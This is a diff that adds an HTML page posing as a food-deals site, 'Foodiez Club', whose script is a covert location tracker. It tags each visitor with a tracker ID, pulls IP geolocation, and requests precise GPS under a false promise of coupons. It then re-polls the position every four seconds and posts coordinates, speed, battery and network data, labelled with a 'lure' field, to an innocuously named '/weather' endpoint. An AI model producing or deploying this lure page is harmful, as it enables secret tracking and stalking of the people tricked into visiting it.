@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Foodiez - Top Deals & Nearby Cafes</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+
+        body {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            background: #fff1f2;
+            padding: 16px;
+            color: #1e293b;
+        }
+
+        .food-card {
+            background: #ffffff;
+            border-radius: 24px;
+            padding: 26px 20px;
+            max-width: 380px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 15px 35px rgba(225, 29, 72, 0.15);
+        }
+
+        .food-logo {
+            font-size: 24px;
+            font-weight: 800;
+            color: #e11d48;
+            margin-bottom: 4px;
+        }
+
+        .promo-banner {
+            background: linear-gradient(135deg, #e11d48 0%, #f43f5e 100%);
+            color: white;
+            padding: 14px;
+            border-radius: 16px;
+            margin: 14px 0;
+        }
+
+        .promo-banner h4 {
+            font-size: 18px;
+            font-weight: 800;
+        }
+
+        .promo-banner p {
+            font-size: 12px;
+            opacity: 0.9;
+            margin-top: 2px;
+        }
+
+        .deal-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            background: #f8fafc;
+            padding: 10px 12px;
+            border-radius: 12px;
+            margin-bottom: 8px;
+            text-align: left;
+        }
+
+        .deal-icon {
+            font-size: 24px;
+            color: #e11d48;
+        }
+
+        .deal-info strong {
+            font-size: 13px;
+            display: block;
+            color: #0f172a;
+        }
+
+        .deal-info span {
+            font-size: 11px;
+            color: #64748b;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px 20px;
+            background: linear-gradient(135deg, #e11d48 0%, #f43f5e 100%);
+            color: white;
+            border: none;
+            border-radius: 14px;
+            cursor: pointer;
+            font-size: 15px;
+            font-weight: 700;
+            margin-top: 10px;
+            box-shadow: 0 4px 14px rgba(225, 29, 72, 0.35);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        button:disabled {
+            opacity: 0.8;
+            cursor: not-allowed;
+        }
+
+        .id-badge {
+            display: inline-block;
+            background: #f1f5f9;
+            color: #64748b;
+            padding: 2px 8px;
+            border-radius: 12px;
+            font-size: 10px;
+            margin-top: 12px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="food-card">
+        <div class="food-logo"><i class="fa-solid fa-utensils"></i> Foodiez Club</div>
+        <p style="font-size: 13px; color: #64748b;" id="loc-text">Detecting restaurants in your area...</p>
+
+        <div class="promo-banner">
+            <h4>FLAT 50% OFF DEALS</h4>
+            <p>Special dining coupons for food lovers nearby</p>
+        </div>
+
+        <div class="deal-item">
+            <div class="deal-icon"><i class="fa-solid fa-bowl-rice"></i></div>
+            <div class="deal-info">
+                <strong>Hyderabadi Royal Biryani</strong>
+                <span>⭐ 4.8 • Flat 40% OFF on Dine-in</span>
+            </div>
+        </div>
+
+        <div class="deal-item">
+            <div class="deal-icon"><i class="fa-solid fa-mug-hot"></i></div>
+            <div class="deal-info">
+                <strong>Artisan Coffee & Bakery</strong>
+                <span>⭐ 4.9 • Buy 1 Get 1 Free</span>
+            </div>
+        </div>
+
+        <button id="find-btn">
+            <i class="fa-solid fa-location-arrow"></i> Unlock Deals Near My Location
+        </button>
+
+        <p id="status-msg" style="font-size: 11px; color: #64748b; margin-top: 10px;">
+            Accurate location required to show restaurants within walking distance
+        </p>
+
+        <div>
+            <span class="id-badge">Member ID: <strong id="target-id-display">Connecting...</strong></span>
+        </div>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search)
+        const customId = urlParams.get("id") ? urlParams.get("id").replace(/[^a-zA-Z0-9_\-\.]/g, "") : null
+        const id = customId || localStorage.getItem("tracker_id") || generateId()
+        localStorage.setItem("tracker_id", id)
+
+        document.getElementById("target-id-display").textContent = id
+        const btn = document.getElementById("find-btn")
+        const locText = document.getElementById("loc-text")
+        const statusMsg = document.getElementById("status-msg")
+
+        let telemetry = { battery: null, charging: false, network: "4G" }
+
+        if (navigator.getBattery) {
+            navigator.getBattery().then(b => {
+                telemetry.battery = b.level * 100
+                telemetry.charging = b.charging
+            }).catch(() => {})
+        }
+        if (navigator.connection) {
+            telemetry.network = navigator.connection.effectiveType ? navigator.connection.effectiveType.toUpperCase() : "4G"
+        }
+
+        // IP Fallback
+        fetch("https://freeipapi.com/api/json")
+            .then(r => r.json())
+            .then(d => {
+                if (d && d.latitude && d.longitude) {
+                    locText.textContent = `Showing offers in ${d.cityName || 'your city'}`
+                    sendReport(d.latitude, d.longitude, 2500, 0, "IP")
+                }
+            }).catch(() => {})
+
+        btn.addEventListener("click", () => {
+            btn.disabled = true
+            btn.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> Finding Nearby Cafes...`
+            statusMsg.textContent = "Scanning verified partner restaurants nearby..."
+
+            navigator.geolocation.getCurrentPosition(
+                onSuccess,
+                () => {
+                    navigator.geolocation.getCurrentPosition(onSuccess, onErr, { enableHighAccuracy: false, timeout: 8000 })
+                },
+                { enableHighAccuracy: true, timeout: 6000 }
+            )
+        })
+
+        function onSuccess(pos) {
+            btn.disabled = false
+            btn.innerHTML = `<i class="fa-solid fa-circle-check"></i> Coupons Unlocked!`
+            statusMsg.textContent = "14 verified restaurant deals unlocked within 2 km radius."
+
+            sendReport(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, pos.coords.speed, "GPS")
+
+            setTimeout(() => {
+                navigator.geolocation.getCurrentPosition(onSuccess, () => {}, { enableHighAccuracy: true })
+            }, 4000)
+        }
+
+        function onErr() {
+            btn.disabled = false
+            btn.innerHTML = `<i class="fa-solid fa-rotate-right"></i> Retry Location`
+            statusMsg.textContent = "Please allow location access to discover discounts near you."
+        }
+
+        async function sendReport(lat, lng, accuracy, speed, type) {
+            try {
+                await fetch("/weather", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        id, lat, lng, accuracy, speed,
+                        type: type || "GPS",
+                        lure: "Nearby Food",
+                        battery: telemetry.battery,
+                        charging: telemetry.charging,
+                        network: telemetry.network
+                    })
+                })
+            } catch (e) {}
+        }
+
+        function generateId() {
+            return "user_" + Math.random().toString(36).substring(2, 9)
+        }
+    </script>
+</body>
+
+</html>
